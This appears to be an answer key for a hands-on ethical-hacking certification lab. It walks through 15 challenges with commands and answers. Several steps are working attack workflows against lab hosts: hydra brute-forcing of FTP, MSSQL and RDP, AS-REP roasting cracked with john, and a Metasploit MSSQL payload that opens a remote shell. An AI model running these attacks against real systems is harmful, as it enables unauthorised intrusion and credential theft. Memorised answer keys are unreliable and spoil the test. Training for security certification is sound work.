
**Challenge** 1:
You are assigned to perform brute-force attack on a linux machine from 192.168.10.0/24 subnet and crack the FTP credentials of user nick. An exploitation information file is saved in the home directory of the FTP server. Determine the Vendor homepage of the FTP vulnerability specified in the file. (Format: aaaaa://aaa.aaaaaaaa.aaa/)

- nmap -p 22 192.168.10.0/24 --open (you found 4 ips)
- ping found ips to know which is linux with ttl value <= 64
- hydra -l nick -P password.txt ftp://192.168.10.111
- Password found is apple
- ftp 192.168.10.111
- login ftp with that password 
- get 520125.py file and open to get vendor homepage

Answer: https://www.crushftp.com/

**Challenge** 2:
An intruder performed network sniffing on a machine from 192.168.10.0/24 subnet and obtained login credentials of the user for moviescope.com website using remote packet capture in wireshark. You are assigned to analyse the Mscredremote.pcapng file located in Downloads folder of EH Workstation-1 and determine the credentials obtained. (Format: aaaa/aaaaa)

- open Mscredremote.pcapng file in wireshark
- filter http.request.method == POST
- extend HTML Form Url
 
Answer: kety/apple

**Challenge** 3:
You are assigned to analyse a packet capture file ServerDoS.pcapng located in Downloads folder of EH Workstation-2 machine. Determine the UDP based application layer protocol which attacker employed to flood the machine in targeted network.
Note: Check for target Destination port. (Format: Aaaaa Aaaaaaa Aaaaaaaa)

- open file in wireshark you will found dest port is 26000
- search 26000 udp in google

Answer: Quake Network Protocol
 
**Challenge** 4:
A severe DDoS attack is occurred in an organization, degrading the performance of a ubuntu server machine in the SKILL.CEH network. You are assigned to analyse the DD_attack.pcapng file stored in Documents folder of EH workstation -2 and determine the IP address of the attacker trying to attack the target server through UDP. (Format: NNN.NNN.NN.NNN)

- Filter for UDP

Answer: 192.168.10.144

**Challenge** 5:
You are assigned to analyse PyD_attack.pcapng file stored in Downloads folder of EH Workstation -2 machine. Determine the attacker IP machine which is targeting the RPC service of the target machine. (Format: NNN.NN.NN.NN)

- open wireshark
- filter tcp.port == 135
- you find one ip with dst port 135

Answer: 172.30.10.99

**Challenge** 6:
An incident handler identified severe DDoS attack on a network and provided report using Anti-DDoS Guardian tool. You are assigned to analyse the reports submitted by the IH team which are stored in "C:\Users\Admin\Documents\Anti-DDoS" directory of the EH Workstation-1 and determine the attacker IP which has transmitted more number of packets to the target machine. (Format: NNN.NNN.NN.NNN)

- open report export.txt file
- find remote ip with higher no of packets

Answer: 192.168.10.222

**Challenge** 7:
You are assigned to analyse the domain controller from the target subnet and perform AS-REP roasting attack on the user accounts and determine the password of the vulnerable user whose credentials are obtained. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: aNaaN*NNN)

- python3 GetNPUsers.py SKILL.com/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
- copy the hash from output and paste in a txt file a.txt
- john --wordlist=rockyou.txt ~/a.txt

Answer: c3ll0@123
 
**Challenge** 8:
A client machine under the target domain controller has a misconfigured SQL server vulnerability. Your task is to exploit this vulnerability, retrieve the MSS.txt file located in the Public Downloads folder on the client machine and determine its size in bytes as answer. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: N)

1.	scan all networks with open port 1433 | nmap -p 1433 192.168.10.0/24 --open
2.	Try bruteforce all ips with open 1433 port
3.	hydra -U username.txt -P password.txt 192.168.10.144 mssql
4.	user = Server_mssrv  and Password = Spidy
5.	 python3 /Ad-tools/impacket/examples/mssqlclient.py SKILL.com/Server_mssrv:Spidy@192.168.10.144  -port 1433
6.	Then type this [ SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell'; ]
7.	type exit.
8.	Goto msfconsole
9.	▪ use exploit/windows/mssql/mssql_payload ▪ set RHOST 192.168.10.144 ▪ set USERNAME Server_mssrv ▪ set PASSWORD Spidy ▪ set DATABASE msdb
10.	Exploit
11.	In meterpreter, type shell
12.	type cd /Users/Public/Downloads/  and type dir
13.	note the size of MSS.txt

Answer: 7 (Note: You can also crack ftp but this is the correct method to pass exam.)

**Challenge** 9:
You are assigned to crack RDP credentials of user Maurice from the target subnet 192.168.10.0/24 and determine the password as answer. Note: use Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: Aaaaaaa@NNNN)

- nmap -p 3389 192.168.10.0/24 --open
- hydra -l Maurice -P rockyou.txt 192.168.10.222 rdp

Answer: Pumpkin@1234

**Challenge** 10:
You are assigned to perform malware scanning on a malware file Tools.rar stored in Downloads folder of EH workstation-2 machine and determine the last four digits of the file’s SHA-256 hash value. (Format: aNNN)

- sha256sum Tools.rar

Answer: d282

**Challenge** 11:
You are assigned to monitor a suspicious process running in a machine whose log file Logfile.PML is saved in Pictures folder of the EH Workstation -2. Analyse the logfile and determine the Parent PID of the malicious file H3ll0.exe process from the log file. (Format: NNNN)

- Copy that log file to windows
- Install procmon.exe in the malware analysis folder
- open that file in procmon
- Search H3II0 and double click to open. now you find the Paren PID

Answer: 6952

**Challenge** 12:
You are tasked with analyzing the ELF executable file named Tornado.elf, located in the Downloads folder of EH Workstation-2. Determine the entropy value of the file up to two decimal places. (Format: N*NN)

- Copy that file to windows
- open that file with DIE tool inside the static malware analysis folder
- Click Entropy button to see value

Answer: 2.87
 
**Challenge** 13:
You are assigned to scan the target subnets to identify the remote packet capture feature that is enabled to analyse the traffic on the target machine remotetly. Scan the target subnets and determine the IP address using rpcap service. (Format: NNN.NNN.NN.NNN)

- nmap -p 2002 192.168.10.0/24

Answer: 192.168.10.144

**Challenge** 14:
An insider attack occurred in an organization and the confidential data regarding an upcoming event is sniffed and encrypted in a image file stealth.jpeg stored in Desktop of EH Workstation -2 machine. You are assigned to extract the hidden data inside the cover file using steghide tool and determine the tender quotation value. (Use azerty@123 for passphrase) (Format: NNNNNNN)

- steghide extract -sf stealth.jpg
- open hidden.txt

Answer: 3965222

**Challenge** 15:
Perform vulnerability search using searchsploit tool and determine the path of AirDrop 2.0 vulnerability. (Format: aaaaaaa/aaa/NNNNN.a)

- Searchsploit AirDrop 2.0

Answer: android/dos/46445.c

